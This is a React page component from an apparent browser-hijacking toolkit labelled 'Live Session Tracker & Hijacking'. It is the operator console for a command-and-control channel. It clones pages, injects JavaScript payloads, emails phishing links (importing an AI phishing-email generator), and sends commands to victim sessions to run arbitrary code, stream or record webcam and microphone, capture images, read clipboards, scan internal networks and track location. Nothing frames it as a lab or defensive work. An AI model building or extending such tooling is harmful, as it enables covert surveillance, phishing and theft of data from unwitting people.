
'use client';

import { useState, useEffect, useRef } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { JavaScriptLibrary } from '@/components/javascript-library';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { LocationTracker } from '@/components/location-tracker';
import { InternalNetworkScannerResults } from '@/components/internal-network-scanner-results';
import { PortScannerResults } from '@/components/port-scanner-results';
import { ClipboardMonitor } from '@/components/clipboard-monitor';
import { SessionHistory } from '@/components/live-tracker/session-history';
import { Card, CardHeader, CardTitle } from '@/components/ui/card';
import { Webcam, Video, Mic, Terminal, Send as SendIcon } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import Image from 'next/image';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import type { JsPayload } from '@/types';
import { generatePhishingEmail, type PhishingOutput } from '@/ai/flows/phishing-flow';
import { sendTestEmail, type SmtpConfig } from '@/actions/send-email-action';
import type { SentEmail } from '@/components/email-outbox';
import { LiveSessionControls } from '@/components/live-tracker/live-session-controls';
import { EmailSender } from '@/components/email-sender';


export default function LiveTrackerPage() {
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);
  const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
  
  const [command, setCommand] = useState('');
  
  const { toast } = useToast();
  const { user } = useAuth();
  const channelRef = useRef<BroadcastChannel | null>(null);

  const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
  const [hostedUrlForEmail, setHostedUrlForEmail] = useState<string>('');

  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  
  const sessionsMap = new Map(Object.entries(sessions));

  const resetStateForSession = () => {
    setIsCameraActive(false);
    setIsMicActive(false);
    setLiveFeedSrc(null);
    setIsRecording(null);
  }

  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');
    
    const handleC2Message = (event: MessageEvent) => {
      const newEvent = event.data;
      if (!newEvent.sessionId) return;
      
      setSessions(prevSessions => {
        const currentSessionEvents = prevSessions[newEvent.sessionId] || [];
        const updatedEvents = [...currentSessionEvents, newEvent];
        return {
          ...prevSessions,
          [newEvent.sessionId]: updatedEvents
        };
      });

      if (newEvent.sessionId === selectedSessionId) {
        if (newEvent.type === 'media-stream') {
            const { data } = newEvent;
            switch(data.type) {
                case 'image-snapshot':
                    setLiveFeedSrc(data.snapshot);
                    setIsCameraActive(true);
                    break;
                case 'video/webm':
                    toast({ title: "Video Received", description: `A video recording was exfiltrated.`});
                    setIsRecording(null);
                    break;
                case 'audio/webm':
                    toast({ title: "Audio Received", description: `An audio recording was exfiltrated.`});
                    setIsRecording(null);
                    break;
                case 'status':
                    if (data.message === 'Permissions granted.') {
                        setIsCameraActive(true);
                        setIsMicActive(true);
                        toast({ title: 'Permissions Granted', description: `Session ${newEvent.sessionId} has camera/mic access.`});
                    } else if (data.message === 'Stream stopped.') {
                        setIsCameraActive(false);
                        setIsMicActive(false);
                        setLiveFeedSrc(null);
                        setIsRecording(null);
                        toast({ variant: 'destructive', title: 'Stream Stopped', description: `Session ${newEvent.sessionId} has stopped the media stream.`});
                    } else {
                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${newEvent.sessionId} reported: ${data.message}`});
                    }
                    break;
                default:
                    toast({ title: 'Media Received', description: `Received media of type ${data.type}`});
            }
        }
      }
    };

    channelRef.current.addEventListener('message', handleC2Message);
    return () => {
        channelRef.current?.removeEventListener('message', handleC2Message);
        channelRef.current?.close();
    };
  }, [setSessions, selectedSessionId, toast]);
  
   useEffect(() => {
    if (!selectedSessionId && sessionsMap.size > 0) {
      const firstSessionId = sessionsMap.keys().next().value;
      setSelectedSessionId(firstSessionId);
    }
  }, [sessionsMap, selectedSessionId]);

  const sendCommandToSession = (command: string, isJsCode = false) => {
    if (!selectedSessionId) {
        toast({ variant: 'destructive', title: 'No session selected' });
        return;
    }
    
    const payload = { 
        type: 'command', 
        sessionId: selectedSessionId, 
        command: isJsCode ? 'execute-js' : command,
        ...(isJsCode && { code: command })
    };
    
    channelRef.current?.postMessage(payload);
    
    const action = isJsCode ? 'Sent JS Command' : `Sent command: ${command}`;
    const details = isJsCode ? `Code: ${command.substring(0, 50)}...` : `Session: ${selectedSessionId}`;
    
    logActivity({ user: user?.displayName || 'Operator', action, details });
  };
  
  const handleSendCommandConsole = () => {
      if (!command) return;
      sendCommandToSession(command, true);
      toast({ title: "Command Sent", description: "The JavaScript command has been sent to the target."});
      setCommand('');
  }
  
  const handleRecording = (type: 'video' | 'audio') => {
      const command = `start-${type}-record`;
      sendCommandToSession(command);
      setIsRecording(type);
      toast({ title: `${type.charAt(0).toUpperCase() + type.slice(1)} Recording Started`});
  }
  
  const handleStopRecording = () => {
      if (!isRecording) return;
      const command = `stop-${isRecording}-record`;
      sendCommandToSession(command);
      toast({ title: 'Stop Recording Command Sent' });
  }

  const openEmailModal = (url: string) => {
    setHostedUrlForEmail(url);
    setIsEmailModalOpen(true);
  };

  const currentSessionEvents = selectedSessionId ? sessions[selectedSessionId] || [] : [];
  const location = currentSessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude)?.data;
  const internalIps = [...new Set(currentSessionEvents.filter(e => e.type === 'internal-ip-found').map(e => e.data.ip))];
  const openPorts = [...new Set(currentSessionEvents.filter(e => e.type === 'port-scan-result').map(e => e.data))];
  const clipboardContent = currentSessionEvents.slice().reverse().find(e => e.type === 'clipboard-read')?.data.pastedText || null;


  return (
    <>
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>
      
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2 flex flex-col gap-6">
            <AdvancedPageCloner selectedPayload={selectedPayload} onSelectPayload={setSelectedPayload} onLinkGenerated={openEmailModal} />
            <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
          </div>
          <div className="flex flex-col gap-6">
             <SessionHistory sessions={sessions} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
             <LiveSessionControls
                isStreaming={isCameraActive || isMicActive}
                isRecording={!!isRecording}
                onStartStream={() => sendCommandToSession('start-video')}
                onStopStream={() => sendCommandToSession('stop-stream')}
                onRecordVideo={() => handleRecording('video')}
                onRecordAudio={() => handleRecording('audio')}
                onStopRecording={handleStopRecording}
                onCaptureImage={() => sendCommandToSession('capture-image')}
             />
          </div>
      </div>
      
      <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
      
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <InternalNetworkScannerResults ips={internalIps} />
        <PortScannerResults ports={openPorts} />
        <ClipboardMonitor content={clipboardContent} />
        <LocationTracker location={location ? { lat: location.latitude, lon: location.longitude } : null} />
      </div>

    </div>

     <EmailSender
        isOpen={isEmailModalOpen}
        onOpenChange={setIsEmailModalOpen}
        phishingLink={hostedUrlForEmail}
     />
    </>
  );
}
